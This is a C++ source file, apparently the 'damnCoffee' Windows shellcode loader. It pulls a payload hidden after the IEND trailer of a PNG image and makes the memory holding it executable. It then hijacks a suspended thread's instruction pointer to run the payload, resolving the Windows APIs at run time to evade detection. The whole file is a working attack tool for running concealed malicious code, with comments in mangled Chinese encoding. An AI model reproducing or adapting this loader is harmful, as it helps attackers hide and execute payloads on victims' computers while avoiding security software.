#include <iostream>
#include <fstream>
#include <vector>
#include <algorithm>
#include <windows.h>

typedef BOOL(WINAPI* GetThreadContext_t)(HANDLE hThread, LPCONTEXT lpContext);
typedef BOOL(WINAPI* SetThreadContext_t)(HANDLE hThread, const CONTEXT* lpContext);
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,LPDWORD lpflOldProtect);
typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
typedef BOOL(WINAPI* VirtualFree_t)(_Pre_notnull_ _When_(dwFreeType == MEM_DECOMMIT, _Post_invalid_) _When_(dwFreeType == MEM_RELEASE, _Post_ptr_invalid_) LPVOID lpAddress,_In_ SIZE_T dwSize,_In_ DWORD dwFreeType);
typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef BOOL(WINAPI* CloseHandle_t)(HANDLE hObject);
typedef DWORD(WINAPI* ResumeThread_t)(_In_ HANDLE hThread);
typedef DWORD(WINAPI* WaitForSingleObject_t)(_In_ HANDLE hHandle,_In_ DWORD dwMilliseconds);

//png�ļ�β��
const std::vector<unsigned char> targetPattern =
{
    0x00, 0x00, 0x00, 0x00,
    0x49, 0x45, 0x4E, 0x44,
    0xAE, 0x42, 0x60, 0x82
};

// ʹ�� vector �洢��������
std::vector<unsigned char> dataVector;

//��ȡshellcode����
int readAndOutputAfterPattern(const std::string& filename)
{
    std::ifstream file(filename, std::ios::binary);
    if (!file)
    {
        std::cerr << "�޷����ļ�: " << filename << std::endl;
        return 1;
    }

    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    auto it = std::search(buffer.begin(), buffer.end(), targetPattern.begin(), targetPattern.end());
    if (it != buffer.end())
    {
        // ����������ݵĴ�С
        size_t dataSize = buffer.end() - (it + targetPattern.size());
        dataVector.resize(dataSize);
        memcpy(&dataVector[0], &buffer[buffer.size() - (dataSize)], dataSize);

        buffer.clear();
        buffer.shrink_to_fit();
        return 0;
    }
    else
    {
        std::cerr << "δ�ҵ�Ŀ���ֽ����С�" << std::endl;

        buffer.clear();
        buffer.shrink_to_fit();
        return 1;
    }
}

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    // �̺߳������˴���ִ�� shellcode
    return 0; // �̷߳���ֵ
}

int main()
{
    printf("   _                   ___       ___  ___          \n");
    printf(" _| | ___ ._ _ _ ._ _ |  _> ___ | | '| | '___  ___ \n");
    printf("/ . |<_> || ' ' || ' || <__/ . \\| |- | |-/ ._>/ ._>\n");
    printf("\\___|<___||_|_|_||_|_|`___/\\___/|_|  |_| \\___.\\___.\n");
    printf("                   https://github.com/fsquirt/damnCoffee\n");

    std::string filename = "j.png"; // ָ���ļ���Ϊ j.png
    if(readAndOutputAfterPattern(filename) == 1) return 1;

    printf("�ļ���װ�� ��СΪ:%d\n", (int)dataVector.size());

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(hKernel32, "VirtualAlloc");
    VirtualProtect_t pVirtualProtect = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetProcAddress(hKernel32, "GetThreadContext");
    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetProcAddress(hKernel32, "SetThreadContext");
    VirtualFree_t pVirtualFree = (VirtualFree_t)GetProcAddress(hKernel32, "pVirtualFree");
    CreateThread_t pCreateThread = (CreateThread_t)GetProcAddress(hKernel32, "CreateThread");
    CloseHandle_t pCloseHandle = (CloseHandle_t)GetProcAddress(hKernel32, "CloseHandle");
    ResumeThread_t pResumeThread = (ResumeThread_t)GetProcAddress(hKernel32, "ResumeThread");
    WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(hKernel32, "WaitForSingleObject");

    // �����ڴ棬������Ȩ��Ϊ��ִ��
    LPVOID exec = pVirtualAlloc(nullptr, dataVector.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec == nullptr)
    {
        std::cerr << "Memory allocation failed!" << std::endl;
        return 1;
    }

    // �� shellcode ���Ƶ�������ڴ���
    memcpy(exec, dataVector.data(), dataVector.size());

    // �ı��ڴ�Ȩ��Ϊ��ִ��
    DWORD oldProtect;
    if (!pVirtualProtect(exec, dataVector.size(), PAGE_EXECUTE_READ, &oldProtect))
    {
        std::cerr << "Failed to change memory protection!" << std::endl;
        return 1;
    }

    dataVector.clear();
    dataVector.shrink_to_fit();

    //-----��ʼִ��-----
    // typedef void (*ShellcodeFunc)();
    // ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(exec);
    // shellcodeFunc();
    // pVirtualFree(exec, 0, MEM_RELEASE);

    HANDLE hThread = pCreateThread(nullptr, 0, ThreadProc, nullptr, CREATE_SUSPENDED, nullptr);
    if (hThread == nullptr)
    {
        std::cerr << "CreateThread failed: " << GetLastError() << std::endl;
        return 1;
    }

    // ��ȡ�̵߳�������
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!pGetThreadContext(hThread, &context))
    {
        std::cerr << "GetThreadContext failed: " << GetLastError() << std::endl;
        pCloseHandle(hThread);
        return 1;
    }

    // �޸��߳���������ָ�� shellcode
    //context.Eip = reinterpret_cast<DWORD>(shellcodeAddress); // ����32λ
    context.Rip = reinterpret_cast<DWORD64>(exec); // ����64λ

    // �����߳�������
    if (!pSetThreadContext(hThread, &context))
    {
        std::cerr << "SetThreadContext failed: " << GetLastError() << std::endl;
        pVirtualFree(exec, 0, MEM_RELEASE);
        pCloseHandle(hThread);
        return 1;
    }

    // �ָ��߳�ִ��
    pResumeThread(hThread);

    // �ȴ��߳̽���
    pWaitForSingleObject(hThread, INFINITE);

    // �ͷ��ڴ�
    pVirtualFree(exec, 0, MEM_RELEASE);
    pCloseHandle(hThread);

    return 0;
}
